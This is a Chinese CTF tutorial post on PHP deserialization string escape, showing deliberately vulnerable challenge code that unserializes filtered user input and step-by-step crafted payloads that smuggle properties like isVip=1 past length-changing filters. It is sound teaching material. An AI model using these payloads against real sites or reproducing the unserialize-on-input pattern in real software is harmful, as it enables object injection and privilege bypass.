---
title: PHP反序列化字符串逃逸
published: 2023-08-25 21:24
category: Web
draft: false
tags: [PHP, 反序列化, 字符串逃逸, CTF]
---

# 反序列化字符串逃逸

## 序列化

将对象序列化存储，下面是一个标准的PHP序列化后的数据流

```php
<?php
class info {
    public $name;
    public $age;

    public function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
}

echo serialize(new info('dcj', 22));
//O:4:"info":2:{s:4:"name";s:3:"dcj";s:3:"age";i:22;}
```

![](/images/posts/php-deserialization-escape/1.jpg)

## 反序列化

将数据流转化为对象

```php
var_dump(unserialize('O:4:"info":2:{s:4:"name";s:3:"dcj";s:3:"age";i:22;}'));

结果：
class info#1 (2) {
  public $name =>
  string(3) "dcj"
  public $age =>
  int(22)
}
```

## 魔术方法

PHP中存在很多魔术方法，特定情况下能够触发这些方法

| 方法名       | 调用条件                                                     |
| ------------ | ------------------------------------------------------------ |
| __call       | 调用不可访问或不存在的方法时被调用                           |
| __callStatic | 调用不可访问或不存在的静态方法时被调用                       |
| __clone      | 进行对象clone时被调用，用来调整对象的克隆行为                |
| __construct  | 构建对象的时候被调用                                         |
| __debuginfo  | 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本 |
| __destruct   | 明确销毁对象或脚本结束时被调用                               |
| __get        | 读取不可访问或不存在属性时被调用                             |
| __invoke     | 当以函数方式调用对象时被调用                                 |
| __isset      | 对不可访问或不存在的属性调用isset()或empty()时被调用         |
| __set        | 当给不可访问或不存在属性赋值时被调用                         |
| __set_state  | 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值 |
| __sleep      | 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用 |
| __toString   | 当一个类被转换成字符串时被调用                               |
| __unset      | 对不可访问或不存在属性进行unset时被调用                      |
| __wakeup     | 当使用unserialize时被调用，可用于做些对象的初始化操作        |

## 字符串溢出

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

class user {
    public $username = 'admin';
    public $password = '123456';

    public $isVip;

    public function __construct($u, $p){
        $this->username = $u;
        $this->password = $p;
        $this->isVip = 0;
    }

    public function login(){
        $isVip = $this->isVip;
        if ($isVip==1){
            echo 'flag is niubi';
        }else{
            echo 'fuck';
        }
    }
}

function filter($obj) {
    return preg_replace("/admin/", "aaaa", $obj);
}

$obj = $_GET['x'];
if (strpos($obj, 'admin') !== false) {
    $obj2 = filter($obj);
    if (isset($obj)){
        $o = unserialize($obj2);
        $o->login();
    }else {
        echo 'fuck';
    }
    // 如果存在admin，执行其他操作
}else{
    die('错误！！！');
}
```

这段代码中入口点对“admin”进行校验，序列化的内容需要存在“admin”，然后使用了filter函数进行过滤，麻烦的在于，若进行替换，“admin”变成了“aaaa”，但是变量长度的数字不变，会导致程序崩溃。

这里就出现了字符串的溢出，下面首先了解字符串逃逸的原理。

### 增加逃逸

当出现filter函数进行替换为比自身多一个字符的情况时，如下所示：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class test{
    public $name = 'admin';
    public $age = '22';

    public function __construct($name, $age)
    {
        $this->name = $name;
        $this->age = $age;
    }
}

function filter($obj) {
    return preg_replace("/admin/", "hacker", $obj);
}

$s=$_GET['payload'];
$ser=filter($s);
$test=unserialize($ser);
```

#### 分析

上面的代码中将“admin”替换为了“hacker”

```php
function filter($obj) {
    return preg_replace("/admin/", "hacker", $obj);
}
```

先在POP中将替换前后的两个结果对比一下

```php
<?php
class test{
    public $name;
    public $age;

    public function __construct($name, $age)
    {
        $this->name = $name;
        $this->age = $age;
    }
}

function filter($obj) {
    return preg_replace("/admin/", "hacker", $obj);
}

$name = 'admin';
$age = '22';
$t = new test($name, $age);
echo serialize($t)."\n";
echo filter(serialize($t))."\n";
```

```php
结果：第二个结果中变量值的长度没有变化，字符串却增加了1位，放到unserialize函数中一定会报错
O:4:"test":2:{s:4:"name";s:5:"admin";s:3:"age";s:2:"22";}
O:4:"test":2:{s:4:"name";s:5:"hacker";s:3:"age";s:2:"22";}
```

第一个正常反序列化，第二个报错

![](/images/posts/php-deserialization-escape/2.jpg)

需要做的是如何在一定会调用filter函数的情况下还能够让序列化数据流格式正确，能够正常解析，这就需要运用字符串溢出

![](/images/posts/php-deserialization-escape/3.jpg)

能够发现，filter函数控制的是我们的name，无论如何变化，后面22个字符是不会发生任何变化的，这里可以不用去思考age的值，可以先认定一个前提，就是让age==='22'为我们所需要达到的条件。

```php
22 = 22 * 1
```

既然有22个字符是固定的，且增量为1，22个字符就需要将admin增加22次，才能够将这22个字符补全。

```php
22 * admin + 22 = 22 * hacker
```

#### 构造

可以先用编写好的payload进行比较

```
adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:3:"age";s:2:"22";}

hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker
```

能够发现两个值的长度是相同的132，试着带入函数进行处理

![](/images/posts/php-deserialization-escape/4.jpg)

```assembly
O:4:"test":2:{s:4:"name";s:132:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:3:"age";s:2:"22";}";s:3:"age";s:2:"22";}
O:4:"test":2:{s:4:"name";s:132:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:3:"age";s:2:"22";}";s:3:"age";s:2:"22";}
```

我们编写的payload如下所示，替换hacker后的结果正好将后面的字符串“推了出去”

```
连接着后面的";s:3:"age";s:2:"22";}正常解析，最后的";s:3:"age";s:2:"22";}被舍去
```

![](/images/posts/php-deserialization-escape/5.jpg)

反序列化也能够正常执行

![](/images/posts/php-deserialization-escape/6.jpg)

### 减少逃逸

反过来，将“hacker”替换为“admin”，减少了1个字符，如下所示：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class test{
    public $name = 'admin';
    public $age = '22';

    public function __construct($name, $age)
    {
        $this->name = $name;
        $this->age = $age;
    }
}

function filter($obj) {
    return preg_replace("/hacker/", "admin", $obj);
}

$s=$_GET['payload'];
$ser=filter($s);
$test=unserialize($ser);
```

#### 分析

在POP中比较一下

```php
生成的序列化数据流中name的长度值没有变，字符串少了1个
O:4:"test":2:{s:4:"name";s:6:"hacker";s:3:"age";s:2:"22";}
O:4:"test":2:{s:4:"name";s:6:"admin";s:3:"age";s:2:"22";}
```

放到unserialize函数中查看

```php
var_dump(unserialize('O:4:"test":2:{s:4:"name";s:6:"hacker";s:3:"age";s:2:"22";}'));
var_dump(unserialize('O:4:"test":2:{s:4:"name";s:6:"admin";s:3:"age";s:2:"22";}'));
```

![](/images/posts/php-deserialization-escape/7.jpg)

减少逃逸中，需要注意的是字符串的长度，和增加不同，不需要统计后面所有的字符串，为什么要看这一部分字符串的长度，因为这一部分是我们不可控的，后面的22是我们可控的。（PS：其实这一部分也是有可控的地方，在减少多个字符串的情况下需要控制这一部分）

![](/images/posts/php-deserialization-escape/8.jpg)

```php
17 = 17 * 1
```

由于是缺少了字符，需要将这17个字符吞掉

```php
hacker * 17 = admin * 17 + ";s:3:"age";s:2:"
```

#### 构造

查看编好的payload

```php
";s:3:"age";s:2:"

hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker

adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:3:"age";s:2:"
```

![](/images/posts/php-deserialization-escape/9.jpg)

由于要将后面的内容构造为完整的序列化数据，所以将后面的内容补全

```php
$name = 'hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker';
$age = ';s:3:"age";s:2:"22";}';
```

这里有一个细节，就是构造的时候，$age的值不能加上前面的引号，因为序列化的时候，格式上会有一个引号在前面

![](/images/posts/php-deserialization-escape/10.jpg)

可以看到构造后运行的结果都为102个字符，后面的age正好也是“22”，成功构造序列化数据，能够正常解析

![](/images/posts/php-deserialization-escape/11.jpg)

### 例题

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

class user {
    public $username = 'admin';
    public $password = '123456';

    public $isVip;

    public function __construct($u, $p){
        $this->username = $u;
        $this->password = $p;
        $this->isVip = 0;
    }

    public function login(){
        $isVip = $this->isVip;
        if ($isVip==1){
            echo 'flag is niubi';
        }else{
            echo 'fuck';
        }
    }
}

function filter($obj) {
    return preg_replace("/admin/", "aaaa", $obj);
}

$obj = $_GET['x'];
if (strpos($obj, 'admin') !== false) {
    $obj2 = filter($obj);
    if (isset($obj)){
        $o = unserialize($obj2);
        $o->login();
    }else {
        echo 'fuck';
    }
    // 如果存在admin，执行其他操作
}else{
    die('错误！！！');
}
```

重新看这道题目，$_GET获取的参数“x”进行了判断，必须包含“admin”，且对“admin”进行了替换，flag入口需要判断$isVip，要正常解析，可以构造如下payload

```php
O:4:"user":3:{s:8:"username";s:110:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:46:";s:8:"password";s:6:"123456";s:5:"isVip";i:1;}";s:5:"isVip";i:1;}
```

![](/images/posts/php-deserialization-escape/12.jpg)

## 补充

在字符串逃逸中，往往会出现无法整除的情况，前面的例子中，都是字符串替换后增加了1个或是减少了1个，从序列化数据流中找到了多少个字符就直接构造即可，但是若出现增加多个字符或是减少多个字符，那构造的形式便会些许复杂。

### 增加四位

例题如下所示：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class a
{
    public $uname;
    public $password;
    public function __construct($uname,$password)
    {
        $this->uname=$uname;
        $this->password=$password;
    }
    public function __wakeup()
    {
        if($this->password==='easy')
        {
            include('flag.php');
            echo $flag;
        }
        else
        {
            echo 'wrong password';
        }
    }
}

function filter($string){
    return str_replace('challenge','easychallenge',$string);
}

$uname=$_GET[1];
$password=1;
$ser=filter(serialize(new a($uname,$password)));
$test=unserialize($ser);
?>
```

这道题中需要将“challenge”替换为“easychallenge”，增加了4个字符，首先在POP链中运行变化前后的结果

```php
O:1:"a":2:{s:5:"uname";s:9:"challenge";s:8:"password";s:4:"easy";}
O:1:"a":2:{s:5:"uname";s:9:"easychallenge";s:8:"password";s:4:"easy";}
```

按照增加的做法，统计后面的字符串长度为29

![](/images/posts/php-deserialization-escape/13.jpg)

这里构造可以有很多种方式，因为29可以写成很多配比形式

```php
29 = 4 * 8 - 3
29 = 4 * 9 - 7
。。。
```

为什么要超过29，因为若构造的长度小于29，就没有办法逃逸完29个字符，若超出了，可以在payload中补充字符串，仍然可以达到溢出的效果，所以这里构造的payload如下，这两种都可以解析

```assembly
challengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";}aaa

challengechallengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";}aaa1111
```

![](/images/posts/php-deserialization-escape/14.jpg)

![](/images/posts/php-deserialization-escape/15.jpg)

### 减少四位

例题如下所示：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class a
{
    public $uname;
    public $password;
    public function __construct($uname,$password)
    {
        $this->uname=$uname;
        $this->password=$password;
    }
    public function __wakeup()
    {
        if($this->password==='easy')
        {
            include('flag.php');
            echo $flag;
        }
        else
        {
            echo 'wrong password';
        }
    }
}

function filter($string){
    return str_replace('easychallenge','challenge',$string);
}

$uname=$_GET[1];
$ser=filter($uname);
$test=unserialize($ser);
?>
```

和增加的区别就是替换的字符串换了位置（减少中需要修改源码，因为若只能传入$uname则不能构成逃逸，因为减少需要的是两个变量都进行构造），这样就需要构造easychallenge来进行字符串溢出，同样先输出POP的结果对比

```php
O:1:"a":2:{s:5:"uname";s:13:"easychallenge";s:8:"password";s:4:"easy";}
O:1:"a":2:{s:5:"uname";s:13:"challenge";s:8:"password";s:4:"easy";}
```

不可控的字符串为22位，但是每次替换都是减少了4位“easy”，不能够被22整除，这里就需要控制不可控字符串的内容

![](/images/posts/php-deserialization-escape/16.jpg)

将两个payload都运行分析结果

```assembly
22 = 4 * 5 + 2
    
easychallengeeasychallengeeasychallengeeasychallengeeasychallenge
";s:8:"password";s:4:"easy";}
```

![](/images/posts/php-deserialization-escape/17.jpg)

替换前是65位，替换后67位

```assembly
22 = 4 * 6 - 2

easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge
";s:8:"password";s:4:"easy";}
```

![](/images/posts/php-deserialization-escape/18.jpg)

替换前78位，替换后76位，按照之前减少字符的构造前提，需要超过不可控字符串的长度，所以要超过22，故这里最少也得需要6个easychallenge（当然更多也可以，不过构造的结果数据量太大）

现在需要补充的就是替换后缺少的2位字符，分析这个序列化数据，其实能够手工控制的还有一个地方

![](/images/posts/php-deserialization-escape/19.jpg)

现在已经很清楚了，缺少两位，所以需要添加$age的值为1000个字符以上即可补充这缺少的两个字符

![](/images/posts/php-deserialization-escape/20.jpg)

由于反序列化解析成功之后，后面的字符串都会被舍去，所以这里写什么都可以

![](/images/posts/php-deserialization-escape/21.jpg)

能够看到，替换前后的uname值都是78位字符串了

![](/images/posts/php-deserialization-escape/22.jpg)

## 总结

字符串逃逸需要先判断手工可控的变量和固定的字符串内容，payload的选取需要大胆一些，毕竟是为了溢出，多了才能够补充，少了就没有办法能够构造。